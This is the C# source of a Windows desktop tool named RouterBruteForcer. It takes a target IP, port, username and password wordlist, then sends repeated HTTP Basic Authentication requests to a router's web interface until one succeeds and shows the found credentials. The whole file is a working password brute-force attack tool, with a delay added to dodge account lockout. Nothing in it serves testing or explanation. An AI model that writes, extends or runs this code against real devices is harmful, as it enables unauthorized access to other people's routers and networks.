using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows;

namespace RouterBruteForcer
{
    public partial class MainWindow : Window
    {
        private bool isRunning = false;

        public MainWindow()
        {
            InitializeComponent();
        }

        private async void StartAttack_Click(object sender, RoutedEventArgs e)
        {
            string ip = IpBox.Text.Trim();
            string port = PortBox.Text.Trim();
            string username = UsernameBox.Text.Trim();
            string wordlistPath = WordlistPathBox.Text.Trim();

            if (string.IsNullOrEmpty(ip) || string.IsNullOrEmpty(username) || string.IsNullOrEmpty(wordlistPath))
            {
                Log("❌ Missing required fields.");
                return;
            }

            if (!File.Exists(wordlistPath))
            {
                Log("❌ Wordlist file not found.");
                return;
            }

            isRunning = true;
            Log("🔥 Starting brute-force attack...");

            string[] passwords = File.ReadAllLines(wordlistPath);
            string baseUrl = $"http://{ip}:{(string.IsNullOrEmpty(port) ? "80" : port)}/";

            using HttpClient client = new HttpClient();

            foreach (string password in passwords)
            {
                if (!isRunning) break;

                string combo = $"{username}:{password}";
                string encoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(combo));

                HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, baseUrl);
                request.Headers.Add("Authorization", $"Basic {encoded}");

                try
                {
                    HttpResponseMessage response = await client.SendAsync(request);
                    if (response.IsSuccessStatusCode)
                    {
                        Log($"✅ SUCCESS: {combo}");
                        MessageBox.Show($"Found credentials!\n{combo}", "Brute Forcer", MessageBoxButton.OK, MessageBoxImage.Information);
                        break;
                    }
                    else
                    {
                        Log($"❌ Failed: {combo} (Status {((int)response.StatusCode)})");
                    }
                }
                catch (Exception ex)
                {
                    Log($"⚠️ Error: {ex.Message}");
                }

                await Task.Delay(100); // Optional delay to avoid lockout
            }

            Log("🔚 Attack finished.");
        }

        private void Log(string msg)
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
                LogBox.AppendText(msg + "\n");
                LogBox.ScrollToEnd();
            });
        }
    }
}
